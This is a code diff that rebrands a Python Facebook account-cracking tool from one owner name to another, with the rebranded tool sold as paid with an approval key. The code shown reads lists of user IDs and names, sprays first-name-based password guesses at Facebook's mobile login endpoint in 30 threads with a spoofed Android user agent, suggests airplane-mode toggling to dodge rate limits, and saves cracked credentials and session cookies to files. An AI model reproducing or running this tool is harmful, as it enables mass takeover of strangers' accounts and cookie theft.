@@ -63,7 +63,7 @@ filter = []
 loop,ok,cp,user = 0,[],[],[]
 cok,plist = [],[]
 #__________________[ SYS ]__________________#
-sys.stdout.write('\x1b]2; FLEUR\x07')
+sys.stdout.write('\x1b]2; KYZER\x07')
 #__________________[ COLOUR ]__________________#
 A = '\x1b[1;97m';R = '\x1b[38;5;196m';Y = '\033[1;33m';G = '\x1b[38;5;48m';B = '\x1b[38;5;8m';G1 = '\x1b[38;5;46m';G2 = '\x1b[38;5;47m';G3 = '\x1b[38;5;48m';G4 = '\x1b[38;5;49m';G5 = '\x1b[38;5;50m';X = '\33[1;34m';X1 = '\x1b[38;5;14m';X2 = '\x1b[38;5;123m';X3 = '\x1b[38;5;122m';X4 = '\x1b[38;5;86m';X5 = '\x1b[38;5;121m';S = '\x1b[1;96m';M = '\x1b[38;5;205m'
 #__________________[ LINEX ]__________________#
@@ -72,21 +72,28 @@ def linex():print(f'{A}───────────────────
 #__________________[ LOGO ]__________________#
 logo =f"""{A}
 
-     {G1}███████ ██████  ██████   ██████  ██████  
-     {G2}██      ██   ██ ██   ██ ██    ██ ██   ██ 
-     {G3}█████   ██████  ██████  ██    ██ ██████  
-     {G4}██      ██   ██ ██   ██ ██    ██ ██   ██ 
-     {G5}███████ ██   ██ ██   ██  ██████  ██   ██                     
+
+ __    __  __      __  ________  ________  _______  
+|  \  /  \|  \    /  \|        \|        \|       \ 
+| $$ /  $$ \$$\  /  $$ \$$$$$$$$| $$$$$$$$| $$$$$$$\
+| $$/  $$   \$$\/  $$     /  $$ | $$__    | $$__| $$
+| $$  $$     \$$  $$     /  $$  | $$  \   | $$    $$
+| $$$$$\      \$$$$     /  $$   | $$$$$   | $$$$$$$\
+| $$ \$$\     | $$     /  $$___ | $$_____ | $$  | $$
+| $$  \$$\    | $$    |  $$    \| $$     \| $$  | $$
+ \$$   \$$     \$$     \$$$$$$$$ \$$$$$$$$ \$$   \$$
+                                                                                               
+
 
 {A}──────────────────────────────────────────────────
-{G1}[{A}•{G1}]{G1} OWNER    {A}:{G1} FLEUR PRETTY
-{G1}[{A}•{G2}]{G2} FACEBOOK {A}:{G2} FLEUR
+{G1}[{A}•{G1}]{G1} OWNER    {A}:{G1} KYZER
+{G1}[{A}•{G2}]{G2} FACEBOOK {A}:{G2} KYZER
 {G1}[{A}•{G3}]{G3} TOOLTYPE {A}:{G3} FILE CLONING
 {G1}[{A}•{G4}]{G4} STATUS   {A}:{G4} PAID
 {A}──────────────────────────────────────────────────"""
 def approval():
   uuid = str(os.geteuid())+"DS"+str(os.geteuid())
-  id = "TITE-"+"".join(uuid)
+  id = "BUGO-"+"".join(uuid)
   os.system('clear')
   print(logo) 
   print("\033[1;37m[\u001b[36m•\033[0;32m] You Need Approval To Use This Tool   \033[1;37m")
@@ -103,7 +110,7 @@ def approval():
       print("\x1b\033[0;32m >> Send Key on Facebook");
       time.sleep(0.1)
       input(' >> Click Enter To Send Your Key ')
-      tks = ('Hello%20Sir%20!%20Please%20Approve%20My%20Token%20The%20Token%20Is%20:%20'+id);os.system('am start https://www.facebook.com/urfleurheinich='+tks),approval()      
+      tks = ('Hello%20Sir%20!%20Please%20Approve%20My%20Token%20The%20Token%20Is%20:%20'+id);os.system('am start https://www.facebook.com/100051353153084='+tks),approval()      
       time.sleep(1)
       exit()
       
@@ -137,7 +144,7 @@ def menu():
     if select =='1':
         _file_()
     elif select =='2':
-        os.system('xdg-open https://www.facebook.com/profile.php?id=100051353153084');menu()
+        os.system('xdg-open https://www.facebook.com/100051353153084');menu()
     elif select =='3':
         exit(f'{G1}[{A}={G1}]{G1} EXIT DONE ')
     else:
@@ -172,7 +179,7 @@ class main_crack():
     def crack(self,id):
         global methods
         clear()
-        print(f'{G1}[{A}={G1}]{G1} EXAMPLE {A}:{G1} /sdcard/FLEUR.txt');linex()
+        print(f'{G1}[{A}={G1}]{G1} EXAMPLE {A}:{G1} /sdcard/file.txt');linex()
         self.file = input(f'{G1}[{A}?{G2}]{G2} FILE NAME {A}:{G2} ')
         try:
             self.id = open(self.file).read().splitlines()
@@ -190,7 +197,7 @@ class main_crack():
         try:
             global oks,cps,loop
             lo  = "Dalvik/2.1.0 (Linux; U; Android 13; SM-A346N Build/TP1A.400498.016) [FBAN/FB4A;FBAV/381.0.0.20.131;FBBV/20154701;FBDM/{density=3.0,width=1080,height=1920};FBLC/en_US;FBCR/TM;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-A346N;FBSV/13;FBCA/armeabi-v7a:armeabi;]"
-            sys.stdout.write(f"\r{G1}[{A}FLEUR-M1{G1}]{A}-{G1}[{A}{loop}{G1}]{A}-{G1}[{A}OK{G1}/{A}CP{G1}]{A}-{G1}[{A}{len(oks)}{G1}/{A}{len(cps)}{G1}] ")
+            sys.stdout.write(f"\r{G1}[{A}CRACKING-M1{G1}]{A}-{G1}[{A}{loop}{G1}]{A}-{G1}[{A}OK{G1}/{A}CP{G1}]{A}-{G1}[{A}{len(oks)}{G1}/{A}{len(cps)}{G1}] ")
             sys.stdout.flush()
             fs = name.split(' ')[0]
             try:
@@ -239,13 +246,13 @@ class main_crack():
                 q = session.post("https://b-graph.facebook.com/auth/login",data=data, headers=headers, allow_redirects=False).json()
                 if 'session_key' in q:
                     ckkk = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"]);swagb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-");cookie = f"sb={swagb};{ckkk}"
-                    print(f"\r\r{G1}[FLEUR-OK] {sid} | {ps} ")
-                    open('/sdcard/SWAG-M1-FILE-OK.txt','a').write(sid+'|'+ps+'|'+cookie+'\n')
+                    print(f"\r\r{G1}[M1-CRACK-OK] {sid} | {ps} ")
+                    open('/sdcard/M1-FILE-COOKIES.txt','a').write(sid+'|'+ps+'|'+cookie+'\n')
                     oks.append(sid)
                     break
                 elif 'www.facebook.com' in q['error']['message']:
-                     print(f"\r\r{M}[FATAY] {sid} | {ps} ")
-                     open('/sdcard/SWAG-M2-FILE-OK.txt','a').write(sid+'|'+ps+'\n')
+                     print(f"\r\r{M}[BUGO] {sid} | {ps} ")
+                     open('/sdcard/M1-FILE-BUGO.txt','a').write(sid+'|'+ps+'\n')
                      cps.append(sid)
                 else:
                     continue
@@ -256,7 +263,7 @@ class main_crack():
     def methodB(self, sid, name, psw):
         try:
             global oks,cps,loop
-            sys.stdout.write(f"\r{G1}[{A}FLEUR-M2{G1}]{A}-{G1}[{A}{loop}{G1}]{A}-{G1}[{A}OK{G1}/{A}CP{G1}]{A}-{G1}[{A}{len(oks)}{G1}/{A}{len(cps)}{G1}] ")
+            sys.stdout.write(f"\r{G1}[{A}CRACKING-M2{G1}]{A}-{G1}[{A}{loop}{G1}]{A}-{G1}[{A}OK{G1}/{A}CP{G1}]{A}-{G1}[{A}{len(oks)}{G1}/{A}{len(cps)}{G1}] ")
             sys.stdout.flush()
             fs = name.split(' ')[0]
             try:
@@ -305,13 +312,13 @@ class main_crack():
                 q = session.post("https://b-graph.facebook.com/auth/login",data=data, headers=headers, allow_redirects=False).json()
                 if 'session_key' in q:
                     ckkk = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"]);swagb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-");cookie = f"sb={swagb};{ckkk}"
-                    print(f"\r\r{G1}[FLEUR-OK] {sid} | {ps} ")
-                    open('/sdcard/SWAG-M2-FILE-OK.txt','a').write(sid+'|'+ps+'|'+cookie+'\n')
+                    print(f"\r\r{G1}[M2-CRACK-OK] {sid} | {ps} ")
+                    open('/sdcard/M2-FILE-COOKIES.txt','a').write(sid+'|'+ps+'|'+cookie+'\n')
                     oks.append(sid)
                     break
                 elif 'www.facebook.com' in q['error']['message']:
-                    print(f"\r\r{M}[FATAY] {sid} | {ps} ")
-                    open('/sdcard/SWAG-M2-FILE-OK.txt','a').write(sid+'|'+ps+'\n')
+                    print(f"\r\r{M}[BUGO] {sid} | {ps} ")
+                    open('/sdcard/M2-FILE-BUGO.txt','a').write(sid+'|'+ps+'\n')
                     cps.append(sid)
                 else:
                     continue
@@ -339,7 +346,7 @@ class main_crack():
             print(f'{G1}[{A}={G2}]{G2} PASSWORD LIMIT {A}:{G1} {sl} ')
             print(f'{G1}[{A}={G3}]{G3} TURN {G3}[{A}ON{A}/{A}OFF{G3}]{G3} AIRPLANE MODE EVERY {A}3{G3} MIN')
             linex()
-            with Habib(max_workers=30) as FLEURworld:
+            with Habib(max_workers=30) as KYZERworld:
                 for zsb in self.id:
                    try:
                        uid, name = zsb.split('|')
@@ -349,9 +356,9 @@ class main_crack():
                        else:
                             pwx =  pw
                             if 'methodA' in methods:
-                                FLEURworld.submit(self.methodA, uid, name, pwx)
+                                KYZERworld.submit(self.methodA, uid, name, pwx)
                             elif 'methodB' in methods:
-                                FLEURworld.submit(self.methodB, uid, name, pwx)
+                                KYZERworld.submit(self.methodB, uid, name, pwx)
                    except:pass
             result(oks,cps)
           
